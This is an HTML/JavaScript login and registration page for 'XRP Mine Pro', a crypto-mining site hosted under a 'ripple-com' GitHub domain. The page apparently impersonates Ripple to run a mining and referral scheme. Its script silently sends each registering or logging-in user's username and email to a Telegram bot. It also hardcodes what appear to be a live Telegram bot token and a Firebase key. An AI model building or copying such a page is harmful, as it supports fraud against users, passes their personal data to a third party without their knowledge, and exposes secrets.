<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XRP Mine Pro - Auth Center (Login/Register) - Firebase Ready</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <style>
        /* Shared Styles from Main Theme */
        :root {
            --primary-color: #03a9f4; /* Blue - Login/Active */
            --secondary-color: #ff9800; /* Orange/Gold - Register/Highlight */
            --accent-color: #4CAF50; /* Green - Register Button/Success */
            --error-color: #f44336; /* Red - Error Messages */
            --card-bg: #212121; 
            --border-color: #333333;
        }

        body {
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #eeeeee;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            line-height: 1.6;
        }
        
        a { color: var(--primary-color); text-decoration: none; transition: color 0.3s; }
        a:hover { color: #81d4fa; }

        .auth-container { 
            background-color: var(--card-bg); 
            padding: 20px 35px 40px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7);
            width: 100%;
            max-width: 480px;
            border-top: 5px solid var(--primary-color); 
            text-align: center;
            transition: border-top-color 0.3s;
        }

        .logo { font-size: 2em; font-weight: 800; color: var(--secondary-color); margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid var(--border-color); }
        .tab-selector { display: flex; justify-content: center; margin-bottom: 30px; }
        .tab-btn { flex-grow: 1; padding: 15px 0; font-size: 1.2em; font-weight: 700; background: none; border: none; color: #9e9e9e; cursor: pointer; border-bottom: 3px solid transparent; transition: color 0.3s, border-bottom 0.3s; }
        .form-content { display: none; padding-top: 10px; }
        .form-content.active { display: block; }

        /* Form Field Styles */
        .input-group { margin-bottom: 20px; text-align: left; }
        .input-group label { display: block; margin-bottom: 8px; color: #bbbbbb; font-weight: 600; }
        .input-group input { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); background-color: #1a1a1a; color: #eeeeee; font-size: 1em; box-sizing: border-box; transition: border-color 0.3s, box-shadow 0.3s; }
        .input-group input:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(3, 169, 244, 0.2); outline: none; }

        /* Button Styles */
        .submit-btn { color: white; padding: 15px 40px; border: none; border-radius: 30px; font-size: 1.1em; font-weight: 700; cursor: pointer; width: 100%; margin-top: 20px; transition: background-color 0.3s, transform 0.2s; }
        #login-form .submit-btn { background-color: var(--primary-color); box-shadow: 0 4px 10px rgba(3, 169, 244, 0.4); }
        #register-form .submit-btn { background-color: var(--accent-color); box-shadow: 0 4px 10px rgba(76, 175, 80, 0.4); }
        .submit-btn:hover { transform: translateY(-1px); }
        
        /* Reset Button Style */
        .reset-btn {
            background-color: var(--secondary-color); /* Orange for Reset */
            box-shadow: 0 4px 10px rgba(255, 152, 0, 0.4);
            margin-top: 10px;
        }
        .reset-btn:hover { background-color: #fb8c00; }


        /* --- VERIFICATION/MESSAGE STYLES --- */
        .verification-message, .reset-password-form {
            background-color: #1e1e1e; 
            padding: 30px;
            border-radius: 8px;
            border: 2px solid var(--secondary-color); 
            margin-top: 20px;
            display: none;
            text-align: left;
        }
        .verification-message h4, .reset-password-form h4 {
            color: var(--secondary-color); 
            font-size: 1.6em;
            margin-top: 0;
            font-weight: 700;
        }
        
        /* Resend Button Style */
        .resend-btn {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            display: inline-block;
            margin-top: 15px;
            transition: background-color 0.3s;
        }
        .resend-btn:hover { background-color: #0288d1; }

        /* Feedback and Error Message Styling */
        .feedback-message {
            margin-top: 15px;
            font-weight: 600;
            padding: 10px;
            border-radius: 4px;
            text-align: center; /* Center feedback messages */
        }
        .feedback-success { color: var(--accent-color); background-color: rgba(76, 175, 80, 0.1); border: 1px solid var(--accent-color); }
        .feedback-error { color: var(--error-color); background-color: rgba(244, 67, 54, 0.1); border: 1px solid var(--error-color); }
        .feedback-pending { color: var(--primary-color); }

    </style>
</head>
<body>

    <div class="auth-container">
        <div class="logo">XRP MINE PRO</div>
        
        <div class="tab-selector">
            <button class="tab-btn active" onclick="showForm('login')"><i class="fas fa-sign-in-alt"></i> Log In</button>
            <button class="tab-btn" onclick="showForm('register')"><i class="fas fa-user-plus"></i> Register</button>
        </div>

        <div id="login-form" class="form-content active">
            <form id="log-form" onsubmit="event.preventDefault(); handleLogin();" method="POST">
                <div class="input-group">
                    <label for="login-email"><i class="fas fa-envelope"></i> Email Address</label>
                    <input type="email" id="login-email" name="email" placeholder="Enter your email" required>
                </div>
                <div class="input-group">
                    <label for="login-password"><i class="fas fa-lock"></i> Password</label>
                    <input type="password" id="login-password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="submit-btn">Secure Log In</button>
                <div id="login-feedback" class="feedback-message" style="display: none;"></div>
                <p style="margin-top: 15px; font-size: 0.9em;">
                    <a href="#" onclick="event.preventDefault(); showResetPasswordForm();">Forgot Password?</a>
                </p>
            </form>
            
            <div id="reset-form" class="reset-password-form">
                <h4><i class="fas fa-key"></i> Reset Password</h4>
                <p style="color: #cccccc; margin-bottom: 20px; font-size: 0.95em;">Enter your email address to receive a password reset link.</p>
                
                <form onsubmit="event.preventDefault(); handlePasswordReset();">
                    <div class="input-group">
                        <label for="reset-email"><i class="fas fa-envelope"></i> Account Email</label>
                        <input type="email" id="reset-email" name="reset_email" placeholder="Enter email for reset link" required>
                    </div>
                    <button type="submit" class="submit-btn reset-btn">Send Reset Link</button>
                    <button type="button" class="submit-btn" style="background-color: #555; margin-top: 10px;" onclick="hideResetPasswordForm()">Cancel</button>
                    <div id="reset-feedback" class="feedback-message" style="display: none;"></div>
                </form>
            </div>
            
        </div>
        
        <div id="register-form" class="form-content">
            <form id="reg-form" onsubmit="event.preventDefault(); handleRegistration();" method="POST">
                <div class="input-group">
                    <label for="reg-username"><i class="fas fa-user"></i> Username</label>
                    <input 
                        type="text" 
                        id="reg-username" 
                        name="username" 
                        placeholder="Choose a username (Max 7, lowercase, no spaces)" 
                        required
                        maxlength="7" 
                        pattern="[a-z0-9]+" 
                        title="Username must be 7 characters or less, contain only lowercase letters (a-z) and digits (0-9), and no spaces."
                        oninput="this.value = this.value.toLowerCase().replace(/\s/g, '')"
                    >
                </div>
                <div class="input-group">
                    <label for="reg-email"><i class="fas fa-envelope"></i> Email Address</label>
                    <input type="email" id="reg-email" name="email" placeholder="Your current email" required>
                </div>
                <div class="input-group">
                    <label for="reg-password"><i class="fas fa-lock"></i> Password</label>
                    <input type="password" id="reg-password" name="password" placeholder="Minimum 8 characters" required>
                </div>
                <div class="input-group">
                    <label for="reg-confirm-password"><i class="fas fa-check-circle"></i> Confirm Password</label>
                    <input type="password" id="reg-confirm-password" name="confirm_password" placeholder="Re-enter your password" required>
                </div>
                
                <button type="submit" class="submit-btn">Create Account</button>
                <div id="register-feedback" class="feedback-message" style="display: none;"></div>
                <p style="margin-top: 15px; font-size: 0.9em; color: #bbbbbb;">By clicking Register, you agree to our Terms.</p>
            </form>

            <div id="verification-msg" class="verification-message">
                <h4><i class="fas fa-paper-plane"></i> Verification Required!</h4>
                <p style="color: #cccccc;">We've successfully created your account. A verification link has been sent to your email address.</p>
                <p style="font-size: 0.9em; font-weight: 600;">Please check your inbox (and spam folder) to activate your account.</p>
                <button class="resend-btn" onclick="resendVerificationEmail(event)">
                    <i class="fas fa-redo"></i> Resend Verification Link
                </button>
                <div id="resend-feedback" class="feedback-message" style="display: none;"></div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
    
    <script>
        // =========================================================================================
        // 1. ⚙️ FIREBASE CONFIGURATION (මෙය ඔබගේ සැබෑ තොරතුරු සමඟ ප්‍රතිස්ථාපනය කරන්න)
        // =========================================================================================
        const firebaseConfig = {
            apiKey: "AIzaSyBsTIzaJtaGiAfv4a69o80f0QvKiq6lFj4", 
            authDomain: "xrp-mine-pro.firebaseapp.com",
            projectId: "xrp-mine-pro",
            storageBucket: "xrp-mine-pro.appspot.com",
            messagingSenderId: "1234567890",
            appId: "1:1234567890:web:abcdef123456"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore(); 
        
        // =========================================================================================
        // 2. 🤖 TELEGRAM BOT CONFIGURATION (මෙම තොරතුරු ඔබගේ Bot වෙත ලැබෙන බැවින් අනාරක්ෂිතය!)
        // =========================================================================================
        // ⚠️ ඔබගේ සැබෑ Telegram Bot Token සහ Chat ID මෙහි යොදන්න
        const TELEGRAM_BOT_TOKEN = "8441096313:AAGtOgFrHFk3ROaRKZoYQ19prswgRvqkU1Y"; 
        const TELEGRAM_CHAT_ID   = "8344580966"; 
        // ⚠️ ඔබගේ සැබෑ වෙබ් අඩවියේ URL එක යොදන්න 
        const DASHBOARD_URL = 'https://ripple-com.github.io/xrp-mine-pro.github.io/dashboard.html'; 
        // =========================================================================================
        
        // ⚡️ REFERRAL SYSTEM 
        let referralIdFromUrl = null; 

        // --- Telegram Notification Function ---
        function sendTelegramNotification(eventType, details) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error("Telegram Token or Chat ID is missing. Notification skipped.");
                return;
            }

            let messageText = `🚨 <b>NEW ${eventType.toUpperCase()} ALERT!</b> 🚨\n\n`;
            
            for (const [key, value] of Object.entries(details)) {
                messageText += `<b>${key}:</b> ${value}\n`;
            }
            
            messageText += `\nTime: ${new Date().toLocaleString()}`; 

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: messageText,
                    parse_mode: 'HTML' 
                }),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Telegram notification failed:', response.status, response.statusText);
                } else {
                    console.log('Telegram notification sent successfully.');
                }
            })
            .catch(error => {
                console.error('Error sending Telegram message:', error);
            });
        }
        
        // --- Utility function to display feedback messages ---
        function displayFeedback(elementId, message, type = 'pending') {
            const element = document.getElementById(elementId);
            element.textContent = message;
            element.style.display = 'block';
            element.className = 'feedback-message'; 
            
            if (type === 'success') {
                element.classList.add('feedback-success');
            } else if (type === 'error') {
                element.classList.add('feedback-error');
            } else {
                element.classList.add('feedback-pending');
            }
        }

        // --- Password Reset Functions ---
        function showResetPasswordForm() {
            document.getElementById('log-form').style.display = 'none';
            document.getElementById('reset-form').style.display = 'block';
            document.getElementById('login-feedback').style.display = 'none';
            document.getElementById('reset-feedback').style.display = 'none';
        }

        function hideResetPasswordForm() {
            document.getElementById('log-form').style.display = 'block';
            document.getElementById('reset-form').style.display = 'none';
            document.getElementById('reset-feedback').style.display = 'none';
        }

        async function handlePasswordReset() {
            const email = document.getElementById('reset-email').value;
            displayFeedback('reset-feedback', 'Sending reset link...', 'pending');

            try {
                await auth.sendPasswordResetEmail(email);
                displayFeedback(
                    'reset-feedback', 
                    'Password reset link sent to ' + email + '. Check your inbox!', 
                    'success'
                );

            } catch (error) {
                let errorMessage = "Failed to send reset email. Try again.";
                
                if (error.code === 'auth/user-not-found') {
                     errorMessage = "Error: Account not found with that email address.";
                } else if (error.code) {
                    errorMessage = error.message.replace('Firebase:', '').trim(); 
                }
                
                displayFeedback('reset-feedback', 'Error: ' + errorMessage, 'error');
                console.error("Firebase Reset Error:", error);
            }
        }


     // 🟢 FIREBASE REGISTER FUNCTION (Referral Logic සහිතව)
async function handleRegistration() {
    const usernameInput = document.getElementById('reg-username');
    let username = usernameInput.value;
    const email = document.getElementById('reg-email').value;
    const password = document.getElementById('reg-password').value;
    const confirmPassword = document.getElementById('reg-confirm-password').value;
    
    displayFeedback('register-feedback', 'Creating account...', 'pending');

    // 1. Password Match Check
    if (password !== confirmPassword) {
        displayFeedback('register-feedback', 'Error: Passwords do not match!', 'error');
        return; 
    }
    
    // 2. Username Validation Check (1-7 characters, lowercase, no spaces)
    username = username.trim(); 
    
    if (username.length === 0 || username.length > 7) { 
        displayFeedback('register-feedback', 'Error: Username must be 1 to 7 characters long.', 'error');
        return;
    }
    
    const usernamePattern = /^[a-z0-9]+$/;
    if (!usernamePattern.test(username)) {
        displayFeedback('register-feedback', 'Error: Username must contain only lowercase letters and digits, with no spaces.', 'error');
        return;
    }

    try {
        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
        const user = userCredential.user;
        
        // Email Verification Setup
        const actionCodeSettings = {
            url: DASHBOARD_URL, 
            handleCodeInApp: false, 
        };
        
        await user.sendEmailVerification(actionCodeSettings); 
        await user.updateProfile({ displayName: username }); 
        
        const userDocRef = db.collection("users").doc(user.uid);
        const newReferralCode = user.uid.substring(0, 8); 
        
        // Firestore Data Saving
        await userDocRef.set({
            username: username, 
            email: email,
            
            // ⚡️ REFERRAL SYSTEM FIELDS
            referralCode: newReferralCode,             
            referredBy: referralIdFromUrl || null,    
            
            balance: 0.00, 
            totalMined: 0.00,
            referrals: 0, 
            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
            totalHashRate: 0.00, 
            estimatedDailyIncome: 0.00
        });
        
        // ⚡️ REFERRAL LOGIC (Updating referrer's count)
        if (referralIdFromUrl) {
            try {
                const referrerQuery = await db.collection("users").where("referralCode", "==", referralIdFromUrl).limit(1).get();
                
                if (!referrerQuery.empty) {
                    const referrerDoc = referrerQuery.docs[0];
                    const referrerDocRef = db.collection("users").doc(referrerDoc.id);
                    
                    await db.runTransaction(async (transaction) => {
                        const doc = await transaction.get(referrerDocRef);
                        if (!doc.exists) {
                            throw "Referrer document does not exist during transaction!";
                        }
                        
                        const currentReferrals = doc.data().referrals || 0;
                        const newReferrals = currentReferrals + 1;
                        
                        transaction.update(referrerDocRef, {
                            referrals: newReferrals 
                        });
                        
                        console.log(`✅ Referral count updated for referrer: ${referrerDoc.data().username}. New count: ${newReferrals}`);
                    });
                } else {
                    console.warn("⚠️ Referrer user not found with code:", referralIdFromUrl);
                }
            } catch (e) {
                 console.error("❌ Error updating referrer count:", e);
            }
        }
        // ⚡️ REFERRAL LOGIC END

        // 🟢 TELEGRAM NOTIFICATION (REGISTER)
        sendTelegramNotification('Registration', {
            Username: username,
            Email: email,
            ReferralCode: newReferralCode,
            ReferredBy: referralIdFromUrl || 'None',
            Status: 'Created, Verification Pending'
        });

        showVerificationMessage();
        
    } catch (error) {
        let errorMessage = "Registration failed. Please try again.";
        if (error.code) {
            errorMessage = error.message.replace('Firebase:', '').trim(); 
        }
        displayFeedback('register-feedback', 'Error: ' + errorMessage, 'error');
        console.error("Firebase Registration Error:", error);
    }
}

        
        // 🟢 FIREBASE LOGIN FUNCTION 
        async function handleLogin() {
            const email = document.getElementById('login-email').value;
            const password = document.getElementById('login-password').value;
            
            displayFeedback('login-feedback', 'Logging in...', 'pending');

            if (document.getElementById('reset-form').style.display === 'block') {
                 hideResetPasswordForm();
            }

            try {
                const userCredential = await auth.signInWithEmailAndPassword(email, password);
                let user = userCredential.user;
                
                // Email Verification Status Refresh
                await user.reload(); 
                user = auth.currentUser; 
                
                if (!user.emailVerified) {
                    displayFeedback(
                        'login-feedback', 
                        'Login failed: Your email address is not verified. Check "Register" tab to resend.', 
                        'error'
                    );
                    
                    await auth.signOut();
                    showForm('register');
                    showVerificationMessage(); 
                    return;
                }
                
                // 🟢 TELEGRAM NOTIFICATION (LOGIN)
                sendTelegramNotification('Login Successful', {
                    Username: user.displayName || 'N/A', // Logged in user's display name
                    Email: email,
                    Status: 'Verified Login'
                });
                
                displayFeedback('login-feedback', 'Login successful! Welcome, ' + user.displayName + '!', 'success');
                window.location.href = DASHBOARD_URL; 
                
            } catch (error) {
                let errorMessage = "Invalid email or password.";
                if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password') {
                     errorMessage = "Invalid email or password.";
                } else if (error.code) {
                    errorMessage = error.message.replace('Firebase:', '').trim();
                }
                displayFeedback('login-feedback', 'Error: ' + errorMessage, 'error');
                console.error("Firebase Login Error:", error);
            }
        }
        
        // --- Resend Verification Email Function ---
        async function resendVerificationEmail(event) {
            event.preventDefault();
            const feedbackMsgId = 'resend-feedback';
            
            displayFeedback(feedbackMsgId, 'Sending new link...', 'pending');

            const user = auth.currentUser;
            
            if (user) {
                try {
                    const actionCodeSettings = { url: DASHBOARD_URL, handleCodeInApp: false };
                    await user.sendEmailVerification(actionCodeSettings);
                    displayFeedback(feedbackMsgId, 'New verification email sent successfully!', 'success');
                } catch (error) {
                    let errorMessage = 'Failed to resend email. Try again later.';
                    if (error.code) {
                         errorMessage = error.message.replace('Firebase:', '').trim();
                    }
                    displayFeedback(feedbackMsgId, 'Error: ' + errorMessage, 'error');
                    console.error("Resend Error:", error);
                }
            } else {
                displayFeedback(feedbackMsgId, 'Error: Please log out and try registering again.', 'error');
            }
        }

        // --- Utility Functions ---
        function showVerificationMessage() {
            const regForm = document.getElementById('reg-form');
            const verificationMsg = document.getElementById('verification-msg');
            regForm.style.display = 'none';
            verificationMsg.style.display = 'block';
            document.getElementById('register-feedback').style.display = 'none';
            document.getElementById('resend-feedback').style.display = 'none';
        }
        
        function showForm(formId) {
            document.querySelectorAll('.form-content').forEach(form => { form.classList.remove('active'); });
            document.querySelectorAll('.tab-btn').forEach(btn => { btn.classList.remove('active'); });
            
            if (document.getElementById('verification-msg').style.display === 'block') {
                document.getElementById('reg-form').style.display = 'block';
                document.getElementById('verification-msg').style.display = 'none';
            }
            
            if (document.getElementById('reset-form').style.display === 'block') {
                 hideResetPasswordForm();
            }
            
            document.getElementById('login-feedback').style.display = 'none';
            document.getElementById('register-feedback').style.display = 'none';

            document.getElementById(formId + '-form').classList.add('active');
            const activeTabButton = document.querySelector(`.tab-btn[onclick*="${formId}"]`);
            activeTabButton.classList.add('active');
            
            const container = document.querySelector('.auth-container');
            if (formId === 'login') {
                container.style.borderTopColor = 'var(--primary-color)'; 
                activeTabButton.style.color = 'var(--primary-color)';
                activeTabButton.style.borderBottomColor = 'var(--primary-color)';
            } else {
                container.style.borderTopColor = 'var(--secondary-color)'; 
                activeTabButton.style.color = 'var(--secondary-color)';
                activeTabButton.style.borderBottomColor = 'var(--secondary-color)';
            }
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            // ⚡️ URL එකෙන් Referral ID එක ලබා ගැනීම
            const urlParams = new URLSearchParams(window.location.search);
            referralIdFromUrl = urlParams.get('ref');

            if (referralIdFromUrl) {
                console.log("Referral ID found in URL (Referred by):", referralIdFromUrl);
            }
            
            showForm('login');
        });
    </script>

</body>
</html>
